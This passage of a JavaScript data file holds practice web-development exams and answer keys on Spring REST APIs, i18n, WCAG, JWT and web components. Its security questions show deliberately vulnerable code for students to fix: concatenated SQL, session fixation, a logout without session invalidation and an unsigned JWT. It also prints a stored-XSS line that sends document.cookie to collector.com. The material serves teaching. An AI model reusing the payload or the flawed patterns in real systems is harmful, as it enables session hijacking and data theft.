@PreAuthorize("hasAuthority('ADMIN') or authentication.details.cid == #cid")
// staff only: list all customers and all event endpoints
@PreAuthorize("hasAuthority('ADMIN')")
~~~` }
      ]},
    { title: "Question 2 – Globalization", weight: 10, tasks: [
        { label: "a", type: "text", q: G11N_Q, sol: "@g11n" },
        { label: "b", type: "code", lang: "properties", q: `<p>As a developer, you have received a task to internationalize the 1-page web application below. Create the resource bundles (property files) for English and any other language of your choice.</p>
<div class="figure mock"><h2 style="margin:0">Bergen Tech Conference</h2><p><b>Date: 14/03/2027</b></p><p>There are 120 of 300 tickets left</p>
<table style="width:auto"><tr><th colspan="2">Ticket Details</th></tr><tr><td>Price</td><td>499 kr</td></tr><tr><td>Venue</td><td>Grieghallen</td></tr><tr><td>Sales end</td><td>01/03/2027</td></tr></table><p><button type="button" disabled>Order tickets</button> &nbsp; <a>Event programme</a></p></div>`,
          starter: "# messages_en.properties\n\n\n# messages_no.properties\n",
          sol: `~~~properties
# messages_en.properties
event.title=Bergen Tech Conference
event.date=Date: {0}
event.left=There are {0} of {1} tickets left
details.header=Ticket Details
details.price=Price
details.venue=Venue
details.salesend=Sales end
button.order=Order tickets
link.programme=Event programme

# messages_no.properties
event.title=Bergen Teknologikonferanse
event.date=Dato: {0}
event.left=Det er {0} av {1} billetter igjen
details.header=Billettdetaljer
details.price=Pris
details.venue=Sted
details.salesend=Salget slutter
button.order=Bestill billetter
link.programme=Program
~~~
<p class="small">Datoer, tall og pris (14/03/2027, 120, 300, 499 kr) er parametere/data som formateres for hvert språk.</p>` },
        { label: "c", type: "text", q: `<p>What are the differences between a SessionLocaleResolver and a CookieLocaleResolver?</p>`, sol: "@sessionVsCookie" }
      ]},
    { title: "Question 3 – Universal Design", weight: 5, tasks: [
        { label: "a", type: "text", q: `<p>What is Web Content Accessibility Guidelines (WCAG)?</p>`, sol: "@wcag" },
        { label: "b", type: "text", q: `<p>Briefly discuss the WCAG principle #4 – "Robust" and the guideline for this principle.</p>`, sol: "@robust" }
      ]},
    { title: "Question 4 – Web security", weight: 25, tasks: [
        { label: "a", type: "text", q: `<p>What is the difference between dynamic application security testing (DAST) and static application security testing (SAST)?</p>`, sol: "@sastDast" },
        { label: "b", type: "code", lang: "java", q: `<p>A customer can list his bookings and sort the result by 'Date', 'Event' or 'Price'. The SQL query in the backend method that handles the sort logic is vulnerable to SQL injection:</p>
~~~java
public List<Booking> getBookingsForCustomer(String customerid, String sortkey) {
    String sql = "SELECT * FROM TicketApp.Booking "
        + "WHERE customerid = '" + customerid
        + "' ORDER BY " + sortkey + " DESC";
    return getBookingList(sql);
}
~~~
<p>TicketApp.Booking has the columns: <code>bookingdate TIMESTAMP</code>, <code>customerid VARCHAR(50)</code>, <code>eventtitle VARCHAR(100)</code>, <code>totalprice INT</code>. The bookingdate column is mapped to 'Date', eventtitle to 'Event' and totalprice to 'Price'.</p>
<p>Write a mitigation for this SQL injection vulnerability.</p>`,
          sol: `<p>1) Validate <code>sortkey</code> so it can only be one of the three columns (it cannot be a <code>?</code> parameter). 2) Use a PreparedStatement where customerid is a parameter.</p>
~~~java
public List<Booking> getBookingsForCustomer(String customerid, String sortkey) {
    String sql;
    if (sortkey.equals("bookingdate") || sortkey.equals("eventtitle")
            || sortkey.equals("totalprice")) {
        sql = "SELECT * FROM TicketApp.Booking WHERE customerid = ? ORDER BY "
            + sortkey + " DESC";
    } else {
        throw new SecurityException("Invalid sort key");     // log invalid input
    }
    PreparedStatement stmt = conn.prepareStatement(sql);
    stmt.setString(1, customerid);
    ResultSet rs = stmt.executeQuery();
    ...
}
~~~` },
        { label: "c", type: "code", lang: "java", q: `<p>Given the code snippet of the authentication controller below:</p>
~~~java
1.  protected void doPost(HttpServletRequest request,
2.          HttpServletResponse response) throws ServletException, IOException {
3.      String username = validate(request.getParameter("username"));
4.      String password = validate(request.getParameter("password"));
5.      AppUser authUser = getAuthenticatedUser(username, password);
6.      if (authUser != null) {
7.          HttpSession session = request.getSession();
8.          session.setAttribute("user", authUser);
9.          session.setAttribute("role", authUser.getRole());
10.         response.sendRedirect("home");
11.     } else {
12.         response.sendRedirect("login");
13.     }
14. }
~~~
<p>I) What major session vulnerability can you see in the authentication controller?<br>II) Write a mitigation for this vulnerability.</p>`,
          sol: `<p><b>Session fixation.</b> <code>request.getSession()</code> returns the existing session, so the session id is the same before and after login. An attacker who has given the victim a known session id can use that session id after the victim has logged in.</p>
~~~java
if (authUser != null) {
    request.getSession().invalidate();                 // remove the old session
    HttpSession session = request.getSession(true);    // new session with a new id
    session.setAttribute("user", authUser);
    session.setAttribute("role", authUser.getRole());
    response.sendRedirect("home");
}
~~~` },
        { label: "d", type: "text", q: `<p>The jjwt-api library that we have used in Oblig4 contains two methods for parsing the JWT token. Method #1 – <code>parse(token)</code> and Method #2 – <code>parseClaimsJws(token)</code>. Assume that the JWT has been modified by changing the role from USER to ADMIN as below:</p>
<p><b>JWT #1</b> – header <code>{"alg": "none"}</code>, payload <code>{"iat": 1765432100, "role": "ADMIN", "user": "Kari"}</code>, encoded: <code>eyJhbGciOiJub25lIn0.eyJpYXQiOjE3NjU0MzIxMDAs….</code> (no signature)</p>
<p><b>JWT #2</b> – header <code>{"alg": "RS256"}</code>, same payload, encoded: <code>eyJhbGciOiJSUzI1NiJ9.eyJpYXQiOjE3NjU0MzIxMDAs….Xk3fP0aGq…</code> (the signature of the original token)</p>
~~~java
1.  try {
2.      Jwt jwt = Jwts.parser().setSigningKey(KEY).parse(accessToken);
3.      Claims claims = (Claims) jwt.getBody();
4.      String user = (String) claims.get("user");
5.      String role = (String) claims.get("role");
6.      if (role.equals("ADMIN")) {
7.          cancelAllBookings();
8.      } else {
9.          log.error("You are not an admin user");
10.     }
11. } catch (JwtException e) {
12.     throw new InvalidTokenException(e);
13. }
~~~
<p>The results of the code for parsing JWT #1 and JWT #2 can be any of: (1) throw an InvalidTokenException in line 12, (2) invoke the method "cancelAllBookings()" in line 7, (3) log the error ("You are not an admin user") in line 9.</p>
<p>Discuss the results the code will produce for I) JWT #1 and II) JWT #2.</p>`,
          sol: `<ul>
<li><b>JWT #1:</b> (2) invokes <code>cancelAllBookings()</code> in line 7. <code>parse()</code> accepts a token without signature (alg none) and does not verify anything, and the role in the token is ADMIN.</li>
<li><b>JWT #2:</b> (1) throws InvalidTokenException in line 12. The token has a signature, so it is verified, but the signature of the original token is not valid for the modified payload.</li>
</ul>
<p>With <code>parseClaimsJws()</code> both tokens give (1), because it requires a correctly signed token.</p>` },
        { label: "e", type: "text", q: `<p>Describe briefly how the 'trust' relationship between an identity provider and a service provider is established.</p>`, sol: "@trust" },
        { label: "f", type: "text", q: `<p>Describe the different approaches to store passwords.</p><p>1. Among the approaches you have discussed, which approach is the best to protect against various attacks and why?<br>2. Describe briefly the attack techniques against passwords.</p>`, sol: ["@pwStore", "@pwAttacks"] }
      ]},
    { title: "Question 5 – JavaScript", weight: 20,
      intro: `<p>A JavaScript module includes the code below (used in a–c):</p>
~~~javascript
const template = document.createElement("template");
template.innerHTML = "<p>Tickets left: <span>120</span></p>";

class TicketCounter extends HTMLElement {
    constructor() {
        super();
        const shadow = this.attachShadow({ mode: 'closed' });
        const content = template.content.cloneNode(true);
        shadow.appendChild(content);
    }
    connectedCallback() { /* Code of connectedCallback() */ }
    disconnectedCallback() { /* Code of disconnectedCallback() */ }
}
customElements.define('ticket-counter', TicketCounter);
~~~`,
      tasks: [
        { label: "a (2%)", type: "text", q: `<p>What are the consequences of running the <code>customElements.define()</code> method?</p>`,
          sol: `<p>It creates a new HTML tag <code>ticket-counter</code> and associates it with the class <code>TicketCounter</code>. Every use of the tag <code>&lt;ticket-counter&gt;</code> creates a <b>new instance</b> of the class TicketCounter.</p>` },
        { label: "b (2%)", type: "code", lang: "javascript", q: `<p>Custom element lifecycle callbacks:</p><p>i. When will the method connectedCallback() run?<br>ii. When will the method disconnectedCallback() run? Create a code example that will trigger the browser to run the disconnectedCallback() method. Observe, the code example should not call the disconnectedCallback() method but cause the browser to run the method.</p>`,
          sol: `<p><b>connectedCallback()</b> runs when the element is inserted into the DOM (the document). <b>disconnectedCallback()</b> runs when the element is removed from the DOM.</p>
~~~javascript
const elm = document.createElement("ticket-counter");
document.body.appendChild(elm);   // connectedCallback runs
elm.remove();                     // disconnectedCallback runs
~~~` },
        { label: "c (2%)", type: "text", q: `<p>Adding the template content to the shadow DOM:</p><p>i. Why should we use the cloneNode() method before adding the template content to the component?<br>ii. What would be the consequences for TicketCounter if the call to cloneNode() was removed, i.e. <code>const content = template.content;</code></p>`,
          sol: `<p>The template content is shared by all instances. <code>cloneNode(true)</code> makes a copy for each instance, so the template is unchanged and can be reused.</p>
<p>Without cloneNode, the template content is <b>moved</b> into the shadow DOM of the first TicketCounter. The template is then <b>empty</b>, so all later TicketCounter instances show nothing. An instance could also change the template content for the others.</p>` },
        { label: "d (2%)", type: "text", q: `<p>JavaScript frameworks and libraries can provide functionality for synchronization of state and view.</p><p>i. In this context, what do we mean with state and view?<br>ii. Provide an example of synchronization of view from state.</p>`, sol: "@stateView" },
        { label: "e (2%)", type: "text", q: `<p>The browser is running asynchronously a piece of JavaScript code that is blocking. How does this affect the browser and the application? You must explain your answer.</p>`, sol: "@blocking" },
        { label: "f (10%)", type: "code", lang: "javascript",
          q: `<p>In this task you are asked to write JavaScript code for an application for ordering tickets. The application is made up of a GUI component <b>EventTickets</b> and a server side with a database of events.</p>
<div class="figure mock"><fieldset><legend>Bergen Tech Conference</legend><p>Tickets left: 120</p><input type="number" value="2" size="3" disabled style="width:60px"> <button type="button" disabled>Order tickets</button><p>Order confirmed</p></fieldset></div>
<p>The component is used like this, where the attribute <code>data-eventid</code> is the id of the event:</p>
~~~html
<event-tickets data-eventid="3"></event-tickets>
~~~
<p>The web server exposes the following endpoints:</p>
<ul><li><code>GET ../api/event?id={id}</code> – returns the event with the given id. Example of a response:
<pre><code>{ "event": { "id": 3, "title": "Bergen Tech Conference", "ticketsleft": 120 }, "responseStatus": true }</code></pre></li>
<li><code>POST ../api/order</code> – orders tickets. The data is sent as JSON in the request body, e.g. <code>{ "eventid": 3, "quantity": 2 }</code>. Example of a response:
<pre><code>{ "ticketsleft": 118, "responseStatus": true }</code></pre></li></ul>
<p>Parameter responseStatus is true if the request was understood by the server and was successful. For an order, responseStatus is false if there are not enough tickets left.</p>
<p><b>Task:</b> Add code to EventTickets that implements the following functionality:</p>
<ul><li>When the component is mounted, the event is fetched from the web server, and the title and the number of tickets left are displayed.</li>
<li>When the user clicks the <b>Order tickets</b> button, the order (event id and the quantity from the input element) is sent to the web server. If the order was successful, the number of tickets left is updated in the view and the text "Order confirmed" is displayed in the element with id message. Otherwise the text "Order failed" is displayed.</li></ul>`,
          starter: `const template = document.createElement("template");
template.innerHTML = \`
    <fieldset>
        <legend id="title"></legend>
        <p>Tickets left: <span id="left"></span></p>
        <form>
            <input type="number" name="quantity" min="1" value="1">
            <button type="button">Order tickets</button>
        </form>
        <p id="message"></p>
    </fieldset>\`;

class EventTickets extends HTMLElement {
    #shadow;
    #serviceurl = "../api";
    // More fields

    constructor() {
        super();
        this.#shadow = this.attachShadow({ mode: 'closed' });
        const content = template.content.cloneNode(true);
        this.#shadow.appendChild(content);
        // More code
    }

    // More methods
}
customElements.define('event-tickets', EventTickets);
`,
          sol: `~~~javascript
class EventTickets extends HTMLElement {
    #shadow;
    #serviceurl = "../api";
    #eventid;
    #titleElm;
    #leftElm;
    #quantityElm;
    #messageElm;

    constructor() {
        super();
        this.#shadow = this.attachShadow({ mode: 'closed' });
        const content = template.content.cloneNode(true);
        this.#shadow.appendChild(content);

        this.#titleElm = this.#shadow.getElementById("title");
        this.#leftElm = this.#shadow.getElementById("left");
        this.#messageElm = this.#shadow.getElementById("message");
        this.#quantityElm = this.#shadow.querySelector("input[name='quantity']");
        this.#shadow.querySelector("button")
            .addEventListener("click", () => { this.#order() });
    }

    connectedCallback() {
        this.#eventid = this.dataset.eventid;
        this.#fetchEvent();
    }

    async #fetchEvent() {
        try {
            const url = \`\${this.#serviceurl}/event?id=\${this.#eventid}\`;
            const response = await fetch(url, { method: "GET" });
            const result = await response.json();
            if (result.responseStatus) {
                this.#titleElm.textContent = result.event.title;
                this.#leftElm.textContent = result.event.ticketsleft;
            }
        } catch (error) {
            this.#messageElm.textContent = "Could not connect to server";
        }
    }

    async #order() {
        const order = {
            "eventid": this.#eventid,
            "quantity": this.#quantityElm.value
        };
        try {
            const response = await fetch(\`\${this.#serviceurl}/order\`, {
                method: "POST",
                headers: { "Content-Type": "application/json; charset=utf-8" },
                body: JSON.stringify(order)
            });
            const result = await response.json();
            if (result.responseStatus) {
                this.#leftElm.textContent = result.ticketsleft;
                this.#messageElm.textContent = "Order confirmed";
            } else {
                this.#messageElm.textContent = "Order failed";
            }
        } catch (error) {
            this.#messageElm.textContent = "Order failed";
        }
    }
}
customElements.define('event-tickets', EventTickets);
~~~` }
      ]}
  ]
});

/* ======================= Øvingseksamen 3: e-Library ======================= */
DAT.exams.push({
  id: "n3", title: "Øvingseksamen 3 – e-Library", kind: "new", appendix: ["spring", "js"],
  questions: [
    { title: "Question 1 – Web Frameworks and Services", weight: 40,
      intro: `<div class="figure"><b>e-Library model</b><br>
User: <code>PK userid</code>, firstname, lastname &nbsp;|&nbsp; Order: <code>PK id</code>, <code>FK userid</code>, isbn, expiry &nbsp;|&nbsp; Book: <code>PK id</code>, isbn, title</div>
<p>The above shows a simple entity model for building an e-library REST service (elibrary). A user can borrow many books. Each time a user borrows a book, an order with an expiry date is created (one-to-many between user and order). Users should be able to register a profile, update their information, borrow books (create orders), list their orders, view an order and return a book (delete the order). The library staff should be able to list all the users and delete a user.</p>`,
      tasks: [
        { label: "a I", type: "text", q: `<p><b>Spring Web MVC:</b> Discuss the relationships between the layers in a Spring MVC application: the presentation layer, the business layer, the persistence layer and the database. Which Spring annotations are used in the different layers?</p>`, sol: "@mvcLayers" },
        { label: "a II", type: "text", q: `<p><b>CI/CD:</b> What is Continuous Integration (CI) and what activities are involved? What is Continuous Deployment/Delivery (CD) and what activities are involved?</p>`, sol: "@cicd" },
        { label: "b", type: "code", lang: "text", q: `<p>Build REST API endpoints for this service. The REST API should provide the following services:</p>
<p><b>User:</b> i. Register/create a profile; ii. View details about own profile; iii. Update profile information; iv. Borrow a book (create an order); v. List all own orders; vi. View a selected order; vii. Return a book (delete the order).</p>
<p><b>Staff:</b> i. List all users; ii. Delete a user.</p>`,
          starter: "Service | API Method | Endpoint (URI) | HTTP Method\nGet or view details about a user | getUser | users/{id} | GET\n",
          sol: `<table><tr><th>Service</th><th>API Method</th><th>Endpoint</th><th>HTTP</th></tr>
<tr><td>Create a profile</td><td>createUser</td><td>/users</td><td>POST</td></tr>
<tr><td>View own profile</td><td>getUser</td><td>/users/{id}</td><td>GET</td></tr>
<tr><td>Update profile</td><td>updateUser</td><td>/users/{id}</td><td>PUT</td></tr>
<tr><td>Borrow a book</td><td>createUserOrder</td><td>/users/{id}/orders</td><td>POST</td></tr>
<tr><td>List all own orders</td><td>getUserOrders</td><td>/users/{id}/orders</td><td>GET</td></tr>
<tr><td>View an order</td><td>getUserOrder</td><td>/users/{id}/orders/{oid}</td><td>GET</td></tr>
<tr><td>Return a book</td><td>deleteUserOrder</td><td>/users/{id}/orders/{oid}</td><td>DELETE</td></tr>
<tr><td>Staff: list all users</td><td>getUsers</td><td>/users</td><td>GET</td></tr>
<tr><td>Staff: delete a user</td><td>deleteUser</td><td>/users/{id}</td><td>DELETE</td></tr></table>` },
        { label: "c I", type: "code", lang: "java", q: `<p>You are provided with the User model class that aggregates the Order objects. Also, you are provided with the repository class for User (UserRepository) containing the CRUD methods required to write the service and controller classes. The implementation is using Spring Framework.</p>
~~~java
@Entity
public class User {
    ...
    private Long userid;
    private Set<Order> orders = new HashSet<>();

    public Set<Order> getOrders() { return orders; }
    public void addOrder(Order order) { orders.add(order); }
    public void removeOrder(Order order) { orders.remove(order); }
    ...
}

public interface UserRepository extends CrudRepository<User, Long> {
    List<User> findAll();
    Optional<User> findById(Long id);
    User save(User user);
    void delete(User user);
}
~~~
<p>Implement the controller class and the methods for all the User REST API endpoints you identified in b). Your methods must return the appropriate HttpStatus code. You can assume two exceptions – <code>UserNotFoundException</code> and <code>OrderNotFoundException</code>.</p>`,
          starter: `@RestController
@RequestMapping("/elibrary/api/v1")
public class UserController {

    // Write your controller methods here

}
`,
          sol: `~~~java
@RestController
@RequestMapping("/elibrary/api/v1")
public class UserController {

    @Autowired
    private UserService userService;

    @GetMapping("/users")
    @PreAuthorize("hasAuthority('ADMIN')")
    public ResponseEntity<Object> getUsers() {
        List<User> users = userService.findAllUsers();
        if (users.isEmpty())
            return new ResponseEntity<>(HttpStatus.NO_CONTENT);
        return new ResponseEntity<>(users, HttpStatus.OK);
    }

    @PostMapping("/users")
    public ResponseEntity<Object> createUser(@RequestBody User user) {
        User nuser = userService.saveUser(user);
        return new ResponseEntity<>(nuser, HttpStatus.CREATED);
    }

    @GetMapping("/users/{id}")
    @PreAuthorize("hasAuthority('ADMIN') or authentication.details.userid == #id")
    public ResponseEntity<Object> getUser(@PathVariable("id") Long id)
            throws UserNotFoundException {
        User user = userService.findUser(id);
        return new ResponseEntity<>(user, HttpStatus.OK);
    }

    @PutMapping("/users/{id}")
    @PreAuthorize("hasAuthority('ADMIN') or authentication.details.userid == #id")
    public ResponseEntity<Object> updateUser(@RequestBody User user,
            @PathVariable("id") Long id) throws UserNotFoundException {
        User uuser = userService.updateUser(user, id);
        return new ResponseEntity<>(uuser, HttpStatus.OK);
    }

    @DeleteMapping("/users/{id}")
    @PreAuthorize("hasAuthority('ADMIN')")
    public ResponseEntity<Object> deleteUser(@PathVariable("id") Long id)
            throws UserNotFoundException {
        userService.deleteUser(id);
        return new ResponseEntity<>(HttpStatus.OK);
    }

    @PostMapping("/users/{id}/orders")
    @PreAuthorize("hasAuthority('ADMIN') or authentication.details.userid == #id")
    public ResponseEntity<Object> createUserOrder(@PathVariable("id") Long id,
            @RequestBody Order order) throws UserNotFoundException {
        Set<Order> orders = userService.createOrderForUser(id, order);
        return new ResponseEntity<>(orders, HttpStatus.CREATED);
    }

    @GetMapping("/users/{id}/orders")
    @PreAuthorize("hasAuthority('ADMIN') or authentication.details.userid == #id")
    public ResponseEntity<Object> getUserOrders(@PathVariable("id") Long id)
            throws UserNotFoundException {
        Set<Order> orders = userService.getUserOrders(id);
        if (orders.isEmpty())
            return new ResponseEntity<>(HttpStatus.NO_CONTENT);
        return new ResponseEntity<>(orders, HttpStatus.OK);
    }

    @GetMapping("/users/{id}/orders/{oid}")
    @PreAuthorize("hasAuthority('ADMIN') or authentication.details.userid == #id")
    public ResponseEntity<Object> getUserOrder(@PathVariable("id") Long id,
            @PathVariable("oid") Long oid)
            throws UserNotFoundException, OrderNotFoundException {
        Order order = userService.getUserOrder(id, oid);
        return new ResponseEntity<>(order, HttpStatus.OK);
    }

    @DeleteMapping("/users/{id}/orders/{oid}")
    @PreAuthorize("hasAuthority('ADMIN') or authentication.details.userid == #id")
    public ResponseEntity<Object> deleteUserOrder(@PathVariable("id") Long id,
            @PathVariable("oid") Long oid)
            throws UserNotFoundException, OrderNotFoundException {
        Set<Order> orders = userService.deleteOrderForUser(id, oid);
        return new ResponseEntity<>(orders, HttpStatus.OK);
    }
}
~~~` },
        { label: "c II", type: "code", lang: "java", q: `<p>Write the service class and the methods for the corresponding controller class in I). An example of a template for the UserService class is given below.</p>`,
          starter: `@Service
public class UserService {

    // Write your service methods here

}
`,
          sol: `~~~java
@Service
public class UserService {

    @Autowired
    private UserRepository userRepository;

    public List<User> findAllUsers() {
        return userRepository.findAll();
    }

    public User saveUser(User user) {
        return userRepository.save(user);
    }

    public User findUser(Long id) throws UserNotFoundException {
        return userRepository.findById(id)
            .orElseThrow(() -> new UserNotFoundException("User with id " + id + " not found!"));
    }

    public User updateUser(User user, Long id) throws UserNotFoundException {
        findUser(id);                       // throws if the user does not exist
        user.setUserid(id);
        return userRepository.save(user);
    }

    public void deleteUser(Long id) throws UserNotFoundException {
        User user = findUser(id);
        userRepository.delete(user);
    }

    public Set<Order> getUserOrders(Long id) throws UserNotFoundException {
        return findUser(id).getOrders();
    }

    public Order getUserOrder(Long id, Long oid)
            throws UserNotFoundException, OrderNotFoundException {
        User user = findUser(id);
        for (Order order : user.getOrders()) {
            if (order.getId().equals(oid))
                return order;
        }
        throw new OrderNotFoundException("Order with id " + oid + " not found!");
    }

    public Set<Order> createOrderForUser(Long id, Order order) throws UserNotFoundException {
        User user = findUser(id);
        user.addOrder(order);
        user = userRepository.save(user);
        return user.getOrders();
    }

    public Set<Order> deleteOrderForUser(Long id, Long oid)
            throws UserNotFoundException, OrderNotFoundException {
        User user = findUser(id);
        Order order = getUserOrder(id, oid);
        user.removeOrder(order);
        user = userRepository.save(user);
        return user.getOrders();
    }
}
~~~` },
        { label: "d I", type: "text", q: `<p>Assume the elibrary service is using a 3rd party identity provider (IdP) for its users based on the OAuth2 protocol.</p><p>Briefly explain the authorization flow using the OAuth2 "resource owner credentials/password grant" scheme between the resource owner and the IdP.</p>`, sol: "@passwordGrant" },
        { label: "d II", type: "code", lang: "java", q: `<p>Assume there are two roles 'ADMIN' and 'USER' in the JWT access token, where ADMIN is assigned to the library staff and USER to the users. Protect the REST API endpoints in the UserController class using relevant Spring annotations and the authentication object. The user id can be accessed as <code>authentication.details.userid</code>.</p>
<ol><li>All /users/{id} endpoints must be accessible only to the correct authenticated user or an admin</li><li>Only an admin can list all users and delete a user</li></ol>`,
          starter: `@RestController
@RequestMapping("/elibrary/api/v1")
public class UserController {
    // update your controller methods with the appropriate
    // roles and Spring authorization annotations
}
`,
          sol: `<p>See the annotations in c I:</p>
~~~java
// /users/{id} and /users/{id}/orders...
@PreAuthorize("hasAuthority('ADMIN') or authentication.details.userid == #id")
// list all users, delete a user
@PreAuthorize("hasAuthority('ADMIN')")
~~~` }
      ]},
    { title: "Question 2 – Globalization", weight: 10, tasks: [
        { label: "a", type: "text", q: G11N_Q, sol: "@g11n" },
        { label: "b", type: "code", lang: "properties", q: `<p>As a developer, you have received a task to internationalize the 1-page web application below. Create the resource bundles (property files) for English and any other language of your choice.</p>
<div class="figure mock"><h2 style="margin:0">Welcome to e-Library</h2><p><a>EN</a> | <a>NO</a></p><p>Hello Kari! You have borrowed 3 books.</p><p>Your next return date is 20/12/2026.</p><p><a>View Books</a> | <a>My Orders</a> | <button type="button" disabled>Log out</button></p></div>`,
          starter: "# messages_en.properties\n\n\n# messages_no.properties\n",
          sol: `~~~properties
# messages_en.properties
welcome.title=Welcome to e-Library
lang.en=EN
lang.no=NO
welcome.hello=Hello {0}! You have borrowed {1} books.
welcome.return=Your next return date is {0}.
link.viewbooks=View Books
link.myorders=My Orders
button.logout=Log out

# messages_no.properties
welcome.title=Velkommen til e-Bibliotek
lang.en=EN
lang.no=NO
welcome.hello=Hei {0}! Du har lånt {1} bøker.
welcome.return=Din neste returdato er {0}.
link.viewbooks=Vis bøker
link.myorders=Mine bestillinger
button.logout=Logg ut
~~~
<p class="small">Navn, antall og dato (Kari, 3, 20/12/2026) er parametere.</p>` },
        { label: "c", type: "text", q: `<p>What is the purpose of a "Controller" class when implementing i18n?</p>`, sol: "@i18nController" }
      ]},
    { title: "Question 3 – Universal Design", weight: 5, tasks: [
        { label: "a", type: "text", q: `<p>What is Universal Design?</p>`, sol: "@ud" },
        { label: "b", type: "text", q: `<p>Give 3 principles of UD.</p>`, sol: "@ud3" },
        { label: "c", type: "text", q: `<p>Briefly discuss the WCAG principle #1 – "Perceivable" and the guidelines for this principle.</p>`, sol: "@perceivable" }
      ]},
    { title: "Question 4 – Web security", weight: 25, tasks: [
        { label: "a", type: "text", q: `<p>You inspect the HTML source of an online forum at https://forum.bookclub.com. In the display name of one user, which is shown on every page where the user has written a post, you find:</p>
~~~html
<script>document.write(\`<img src='' onerror='http://collector.com/?'document.cookie/>\`);</script>
~~~
<p>Explain the types of vulnerability in this attack scenario.</p>`,
          sol: `<p>This is a <b>stored (persistent) XSS</b>. The script is saved on the server as the display name of a user and runs in the browser of every user who views a page where the name is shown. The attacker aims to <b>steal the session cookie</b> of the forum users (<code>document.cookie</code> is sent to collector.com) so he can hijack their sessions.</p>` },
        { label: "b", type: "text", q: `<p>An online shop adds a hidden field with a random value to every form. The same random value is stored in the session of the user on the server. When a form is submitted, the shop compares the value in the form with the value in the session, and rejects the request if they are not equal.</p><p>I) Explain the type of CSRF mitigation described above.<br>II) Briefly explain the difference between XSS and CSRF.</p>`,
          sol: [`<p>This is the <b>synchronizer token pattern</b>.</p>`, "@syncToken", "@xssVsCsrf"] },
        { label: "c", type: "text", q: PW4_Q, sol: "@pw4" },
        { label: "d", type: "code", lang: "java", q: `<p>Given the 2 SQL queries below:</p>
~~~java
// Implementation 1
public List<Order> getOrders(String userid) {
    ...
    Statement stmt = conn.createStatement();
    stmt.executeQuery("SELECT * FROM ELibrary.Orders WHERE USERID = '" + userid + "'");
    ...
}

// Implementation 2
public Book getBook(String isbn) {
    ...
    PreparedStatement stmt = conn.prepareStatement("SELECT * FROM ELibrary.Book WHERE ISBN = ?");
    stmt.setString(1, isbn);
    stmt.executeQuery();
    ...
}
~~~
<p>I) Which of the two implementations can be vulnerable to SQL injection vulnerability?<br>II) Write the mitigation code for the implementation that you identified as vulnerable.</p>`,
          sol: `<p>Only <b>implementation 1</b> is vulnerable to SQLi: the untrusted data (userid) is concatenated into the query string. Implementation 2 is not vulnerable, because it uses a PreparedStatement correctly: the query has a placeholder (?) and the untrusted data is bound as a parameter.</p>
~~~java
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM ELibrary.Orders WHERE USERID = ?");
stmt.setString(1, userid);
stmt.executeQuery();
~~~` },
        { label: "e", type: "text", q: `<p>A client can access a protected resource by sending a request together with a JWT token to the "Resource Server". The JWT token is issued to the client by the "Authorization Server".</p><p>I) Describe the security actions that the "Authorization Server" must take before sending the JWT token in a response to the client.<br>II) Describe the security actions that the "Resource Server" must take before sending the protected resource to the client.</p>`, sol: ["<p><b>I) Authorization Server:</b></p>", "@asActions", "<p><b>II) Resource Server:</b></p>", "@rsChecks"] },
        { label: "f", type: "code", lang: "java", q: `<p>I) You have saved a session token as a cookie in a web browser storage. What are the secure ways to protect the cookie from XSS vulnerability and session hijacking attack?</p>
<p>II) A logout controller of a web application contains the code below. What major session vulnerability is present in this implementation? Write a mitigation for this vulnerability.</p>
~~~java
@WebServlet("/logout")
public class LogoutServlet extends HttpServlet {
    protected void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        request.getSession().setAttribute("user", null);
        response.sendRedirect("login");
    }
}
~~~`,
          sol: ["@cookieProtect", `<p><b>II)</b> The logout does not invalidate the session. The user attribute is set to null, but the session is still valid and other attributes can still be used or leaked.</p>
~~~java
request.getSession().invalidate();
response.sendRedirect("login");
~~~`] }
      ]},
    { title: "Question 5 – JavaScript", weight: 20, tasks: [
        { label: "a (2%)", type: "text", q: `<p>What is the maximum number of concurrent threads that can access the DOM? You must explain why this is the maximum number to get any credits on this task.</p>`, sol: "@domThreads" },
        { label: "b (2%)", type: "text", q: `<p>Give examples of situations where JavaScript code will be run asynchronously. Observe, you are not asked to write any JavaScript code. To get points on this task, you must clearly explain the asynchronous behaviour of your examples.</p>`, sol: "@asyncExamples" },
        { label: "c (2%)", type: "code", lang: "html", q: `<p>The HTML tag &lt;SLOT&gt; can be useful when making a web component.</p><p>1. What is the purpose of the tag &lt;SLOT&gt;?<br>2. Demonstrate with code examples how to use the &lt;SLOT&gt; tag.</p>`,
          sol: `<p><code>&lt;slot&gt;</code> is a placeholder inside a component that is replaced by the content the user of the component puts inside the custom tag. With several slots, each slot has a name, and the content uses the <code>slot</code> attribute.</p>
~~~html
<!-- in the component -->
<p>Borrowed by <slot name="user">unknown</slot></p>
<!-- use -->
<book-info><span slot="user">Kari</span></book-info>
~~~` },
        { label: "d (2%)", type: "code", lang: "javascript", q: `<p>A component with shadow DOM and mode set to closed should produce the view represented by the HTML code below:</p><p><code>&lt;P&gt;Borrowed by &lt;SPAN&gt;Kari&lt;/SPAN&gt;&lt;/P&gt;</code></p><p>The name of the user is decided by the parent component. Discuss different approaches for the parent component to set the name to be displayed by the child component.</p>`,
          sol: `<p>With the custom tag <code>&lt;book-info&gt;</code>:</p>
<ol>
<li><b>Slot:</b> <code>&lt;book-info&gt;&lt;span slot="user"&gt;Kari&lt;/span&gt;&lt;/book-info&gt;</code></li>
<li><b>Content of the tag:</b> <code>&lt;book-info&gt;Kari&lt;/book-info&gt;</code>, read by the component with <code>this.textContent</code>.</li>
<li><b>Attribute:</b> <code>&lt;book-info data-user="Kari"&gt;</code>, read with <code>this.dataset.user</code> or <code>getAttribute</code>.</li>
<li><b>Public method (API):</b> <code>bookinfo.setUser("Kari")</code>.</li>
</ol>` },
        { label: "e (2%)", type: "code", lang: "javascript", q: `<p>A web application includes a file dateutil.js with the following code:</p>
~~~javascript
export default {
    // Returns the number of days until the given date
    daysuntil(date) { /* JavaScript code */ },
    // Returns the date formatted for the given language
    format(date, language) { /* JavaScript code */ }
}
~~~
<p>i. What are the consequences of the <code>export default</code> statement at the beginning of the file?<br>ii. Demonstrate how to import dateutil.js from another JavaScript module, and how to call the method daysuntil from that module. You can choose the file folder structure as you wish.</p>`,
          sol: `<p>A module can have zero or one <code>export default</code>. It tells what is imported from the module if we do not name what to import, and the importer chooses the name.</p>
~~~javascript
// js/main.js, with the file in js/modules/dateutil.js
import dateutil from './modules/dateutil.js';

const days = dateutil.daysuntil(new Date(2026, 11, 20));
console.log(days);
~~~` },
        { label: "f (6%)", type: "code", lang: "javascript",
